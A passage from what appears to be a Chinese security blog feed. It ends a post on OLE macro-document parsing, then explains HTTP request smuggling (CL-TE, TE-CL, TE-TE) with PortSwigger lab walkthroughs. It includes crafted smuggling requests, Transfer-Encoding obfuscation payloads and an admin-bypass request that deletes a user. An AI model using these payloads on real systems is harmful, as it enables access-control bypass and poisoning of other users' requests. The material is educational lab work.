<p><strong>6 符合文档（OLE文件）二进制解析</strong></p>
<p><strong>6.1复合文档数据结构解析</strong></p>
<p>Office文档（如：doc、ppt、xls）很多是复合文档（OLE文件），所有文件数据都是存储在一个活多个流中。每个流都有一个相似的数据结构，用于存储元数据的数据结构。这些元数据有客户和系统的信息、文档属性、格式信息、文本内容、媒体内容。宏代码信息也是以这种方式存储在复合文档中的。</p>
<p>为了在Office文档文件中提取宏代码，必须能够解析符合文档的二进制格式，下面以word威力，分析复合文档的二进制文件结构。</p>
<p><strong>6.1.1.准备工作</strong></p>
<p>①准备工作：</p>
<p>Office Visualization Tool:微软提供的office二进制格式查看工具，用于学习doc,xls,ppt等文档二进制格式；</p>
<p>010Editor：一款流行的二进制编辑器</p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>宏病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP请求走私漏洞分析</title>
    <url>/2020/09/12/WEB/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h3><p>HTTP协议是Hyper Text Transfer Protocol(超文本传输协议)：一种无状态的、应用层的、以请求/应答方式运行的协议，它使用可扩展的语义和自描述消息格式，与基于网络的超文本信息系统灵活的互动</p>
<p>HTTP协议工作于客户端-服务端架构之上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912191232407.png" alt="image-20200912191232407"></p>
<p>HTTP是一个基于TCP/IP通信协议来传递数据(HTML 文件, 图片文件, 查询结果等)。</p>
<a id="more"></a>

<h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p>在创建过程当中，三次握手就是代表着有三次网络传输，客户端发送一次，然后服务端返回一次，然后客户端再发送一次，这个时候才创建了tcp连接，然后才能去发送http请求</p>
<p>而HTTP1.0协议和HTTP1.1协议之所以不同，一部分也在于此：<br>在HTTP1.0里面，这个连接是在http请求创建的时候，就去创建这个tcp连接，然后连接创建完之后，请求发送过去，服务器响应之后，这个tcp连接就关闭了</p>
<p>在HTTP1.1协议中，可以用<code>Keep-Alive</code>方法去申明这个连接可以一直保持，那么第二个http请求就没有三次握手的开销，而且相较于HTTP1.0，HTTP1.1有了<code>Pipeline</code>，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p>
<h3 id="HTTP属性"><a href="#HTTP属性" class="headerlink" title="HTTP属性"></a>HTTP属性</h3><h4 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200 OK &#x2F;&#x2F;客户端请求成功</span><br><span class="line">400 Bad Request &#x2F;&#x2F;客户端请求有语法错误，不能被服务器所理解</span><br><span class="line">401 Unauthorized &#x2F;&#x2F;请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</span><br><span class="line">403 Forbidden &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务</span><br><span class="line">404 Not Found &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL</span><br><span class="line">500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误</span><br><span class="line">503 Server Unavailable &#x2F;&#x2F;服务器当前不能处理客户端的请求，一段时间后可能恢复正常</span><br></pre></td></tr></table></figure>

<h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept：</span><br><span class="line">表示浏览器支持的MIME类型</span><br><span class="line">Accept-Encoding：</span><br><span class="line">浏览器支持的压缩类型</span><br><span class="line">Accept-Language</span><br><span class="line">浏览器支持的语言类型，并且优先支持靠前的语言类型</span><br><span class="line">Connection</span><br><span class="line">当浏览器与服务器通信时对于长连接如何进行处理：close&#x2F;keep-alive</span><br><span class="line">Cookie</span><br><span class="line">向服务器返回cookie，这些cookie是之前服务器发给浏览器的</span><br><span class="line">Host：</span><br><span class="line">请求的服务器URL</span><br><span class="line">User-Agent：</span><br><span class="line">用户使用的客户端的一些必要信息，比如操作系统、浏览器及版本、浏览器渲染引擎等。</span><br><span class="line">判断是否为ajax请求如果没有该属性则说明为传统请求</span><br></pre></td></tr></table></figure>

<h4 id="响应头："><a href="#响应头：" class="headerlink" title="响应头："></a>响应头：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server，服务端所使用的Web服务名称，如：Server：Apache&#x2F;1.3.6(Unix)。</span><br><span class="line">Set-Cookie：服务器向客户端设置的Cookie。</span><br><span class="line">Last-Modified，服务器通过这个域告诉客户端浏览器，资源的最后修改时间。</span><br><span class="line">Location：重定向用户到另一个页面，比如身份认证通过之后就会转向另一个页面。这个域通常配合302状态码使用。</span><br><span class="line">Content-Length：body部分的长度（单位字节）。</span><br></pre></td></tr></table></figure>

<h2 id="发展时间线"><a href="#发展时间线" class="headerlink" title="发展时间线"></a>发展时间线</h2><p>最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。</p>
<blockquote>
<p><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></p>
</blockquote>
<p>在2016年的DEFCON 24 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。</p>
<blockquote>
<p>[<a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]</a>(<a href="https://media.defcon.org/DEF">https://media.defcon.org/DEF</a> CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf)</p>
</blockquote>
<p>在2019年的BlackHat USA 2019上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。</p>
<blockquote>
<p><a href="https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153">https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153</a></p>
</blockquote>
<p>HTTP Request Smuggling最早是在2005年由Watchfire记录的，但是由于其利用条件比较苛刻，很长一段时间，Web层面的漏洞如雨后春笋般冒了出来， 就像之前的不被重视的xss一样，HTTP Request Smuggling同样被忽略了。但大神们总是能带来神奇的体验，利用此漏洞成功拿到了近70K$的奖金，这不 仅让许多互联网大厂重视了起来，也让该漏洞走进了安全爱好者的视野。</p>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><h3 id="keep-alive-与-pipeline"><a href="#keep-alive-与-pipeline" class="headerlink" title="keep-alive 与 pipeline"></a>keep-alive 与 pipeline</h3><p>为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，ip 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销。这里就用到了 HTTP1.1 中的 <code>Keep-Alive</code> 和 <code>Pipeline</code> 特性：</p>
<blockquote>
<p>所谓 Keep-Alive，就是在 HTTP 请求中增加一个特殊的请求头 Connection: Keep-Alive，告诉服务器，接收完这次 HTTP 请求后，不要关闭 TCP 链接，后面对相同目标服务器的 HTTP 请求，重用这一个 TCP 链接，这样只需要进行一次 TCP 握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在 HTTP1.1 中是默认开启的。</p>
<p>有了 Keep-Alive 之后，后续就有了 Pipeline，在这里呢，客户端可以像流水线一样发送自己的 HTTP 请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循<strong>先入先出</strong>机制，将请求和响应严格对应起来，再将响应发送给客户端。现如今，浏览器默认是不启用 Pipeline 的，但是一般的服务器都提供了对 Pipleline 的支持。</p>
</blockquote>
<p>在正常情况下用户发出的 HTTP 请求的流动如下图：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912191248744.png" alt="image-20200912191248744"></p>
<p>这意味着突然之间，后端与前端就每个消息的结尾达成一致至关重要。否则，攻击者可能能够发送模糊的消息，该消息被后端解释为两个不同的HTTP请求：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912191259769.png" alt="image-20200912191259769"></p>
<p>为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200903192043459.png" alt="image-20200903192043459"></p>
<p>一般来说，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用，也就顺理成章了。</p>
<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
<h2 id="五种常见的走私请求"><a href="#五种常见的走私请求" class="headerlink" title="五种常见的走私请求"></a>五种常见的走私请求</h2><h3 id="1-CL不为0的GET请求"><a href="#1-CL不为0的GET请求" class="headerlink" title="1 CL不为0的GET请求"></a>1 CL不为0的GET请求</h3><p>其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。</p>
<p>在<code>RFC2616</code>中，没有对GET请求像POST请求那样携带请求体做出规定，在最新的<code>RFC7231</code>的4.3.1节中也仅仅提了一句。</p>
<blockquote>
<p><a href="https://tools.ietf.org/html/rfc7231#section-4.3.1">https://tools.ietf.org/html/rfc7231#section-4.3.1</a></p>
<p>sending a payload body on a GET request might cause some existing implementations to reject the request</p>
</blockquote>
<p>假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p>
<p>比如我们构造请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求，分别是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>

<p>这就导致了请求走私</p>
<h3 id="2-CL-CL"><a href="#2-CL-CL" class="headerlink" title="2 CL-CL"></a>2 CL-CL</h3><p>在<code>RFC7230</code>的第<code>3.3.3</code>节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p>
<blockquote>
<p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3"><br>https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p>
</blockquote>
<p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。</p>
<p>此时恶意攻击者可以构造一个特殊的请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其他的正常用户对服务器进行了请求，假设请求如图所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>

<p>从前面我们也知道了，代理服务器与源站服务器之间一般会重用TCP连接。</p>
<p>这时候正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aGET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>

<p>这时候用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于CSRF的攻击方式。</p>
<p>但是两个<code>Content-Length</code>这种请求包还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在<code>RFC2616</code>的第4.4节中，规定:<code>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</code>，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回<code>400</code>错误。服务器在这里的实现更容易出问题。</p>
<blockquote>
<p><a href="https://tools.ietf.org/html/rfc2616#section-4.4">https://tools.ietf.org/html/rfc2616#section-4.4</a></p>
</blockquote>
<h3 id="3-CL-TE"><a href="#3-CL-TE" class="headerlink" title="3 CL-TE"></a>3 CL-TE</h3><p>所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p>
<p>chunk传输数据格式如下，其中size的值由16进制表示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>

<p>Lab 地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acb51fb91e44b90480444e0700f300db.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Referer: https:&#x2F;&#x2F;acb51fb91e44b90480444e0700f300db.web-security-academy.net&#x2F;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;8PEc1O3nvJK1TMe34CRurWHbtmNlffXL</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">ol4three</span><br></pre></td></tr></table></figure>

<p>连续发送几次请求就可以获得该响应。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904102611844.png" alt="image-20200904102611844"></p>
<p>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为13，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">ol4three</span><br></pre></td></tr></table></figure>

<p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母ol4three就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OL4THREEPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>服务器在解析时就会产生报错。</p>
<h3 id="4-TE-CL"><a href="#4-TE-CL" class="headerlink" title="4 TE-CL"></a>4 TE-CL</h3><p>所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acd21f681f756cf681ed0710009f00f1.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Cookie: session&#x3D;Ucdk8vByxAP8kqS8Ww6N7GuJ1jtDuSTE</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">oPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904102554315.png" alt="image-20200904102554315"></p>
<p>由于前端服务器处理<code>T ransfer-Encoding</code>，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对代理服务来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>成功报错。</p>
<h3 id="5-TE-TE"><a href="#5-TE-TE" class="headerlink" title="5 TE-TE"></a>5 TE-TE</h3><p><code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acab1f6b1ec9478a801fb8a90003005b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Referer: https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;request-smuggling&#x2F;lab-ofuscating-te-header</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;V9iX0s5p7jOrkL0RMxDZxVvZdqMgYgjo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">oPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904103359779.png" alt="image-20200904103359779"></p>
<p>PortSwigger 给出了一些可用于混淆的 payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding[空格]: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[空格]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>

<h2 id="其他攻击实例"><a href="#其他攻击实例" class="headerlink" title="其他攻击实例"></a>其他攻击实例</h2><p>以下是 PortSwigger 列举的攻击方式，另外还有 @Regilero 大佬的更多姿势：</p>
<blockquote>
<p><a href="https://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/#toc3">https://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/#toc3</a></p>
<p><a href="https://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/#toc4">https://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/#toc4</a></p>
<p><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc7">https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc7</a></p>
</blockquote>
<h3 id="1-绕过前端服务器的安全控制"><a href="#1-绕过前端服务器的安全控制" class="headerlink" title="1 绕过前端服务器的安全控制"></a>1 绕过前端服务器的安全控制</h3><p>在这个网络环境中，前段服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后段服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用<code>CL-TE</code>和<code>TE-CL</code>绕过前端的访问控制</p>
<h4 id="1-1-使用CL-TE绕过前端服务器安全控制"><a href="#1-1-使用CL-TE绕过前端服务器安全控制" class="headerlink" title="1.1 使用CL-TE绕过前端服务器安全控制"></a>1.1 使用CL-TE绕过前端服务器安全控制</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
<p>实验的最终目的是获取admin权限并删除用户carlos</p>
<p>我们直接访问<code>/admin</code>,会返回提示<code>Path /admin is blocked</code>，看样子是被前端服务器阻止了，根据题目的提示<code>CL-TE</code>，我们可以尝试构造数据包</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912174247061.png" alt="image-20200912174247061"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac001ff21f8e14a68000ff8100ed0001.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Cookie: session&#x3D;47f6w4amWuXJBmai7o4kaxEvPqMX36QH</span><br><span class="line">Content-Length: 42</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">foo: bar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进行多次请求之后，我们可以获得走私过去的请求的响应<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912183708172.png" alt="image-20200912183708172"></p>
<p>提示只有是以管理员身份访问或者在本地登录才可以访问<code>/admin</code>接口。</p>
<p>在下方走私的请求中，添加一个<code>Host: localhost</code>请求头，然后重新进行请求，一次不成功多试几次。</p>
<p>如图所示，我们成功访问了admin界面。也知道了如何删除一个用户，也就是对<code>/admin/delete?username=carlos</code>进行请求。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912183850522.png" alt="image-20200912183850522"></p>
<p>修改下走私的请求包再发送几次即可成功删除用户<code>carlos</code>。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200221367.png" alt="image-20201201200221367"></p>
<p>需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个<code>\r\n</code>不能丢弃。</p>
<h4 id="1-2-使用TE-CL绕过前端服务器安全控制"><a href="#1-2-使用TE-CL绕过前端服务器安全控制" class="headerlink" title="1.2 使用TE-CL绕过前端服务器安全控制"></a>1.2 使用TE-CL绕过前端服务器安全控制</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p>
<p>这个实验与上一个就十分类似.</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200254744.png" alt="image-20201201200254744"></p>
<h3 id="2-获取前端服务器重写请求字段"><a href="#2-获取前端服务器重写请求字段" class="headerlink" title="2 获取前端服务器重写请求字段"></a>2 获取前端服务器重写请求字段</h3><p>在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p>
<ul>
<li>描述TLS连接所使用的协议和密码</li>
<li>包含用户IP地址的XFF头</li>
<li>用户的会话令牌ID</li>
</ul>
<p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p>
<ul>
<li>找一个能够将请求参数的值输出到响应中的POST请求</li>
<li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li>
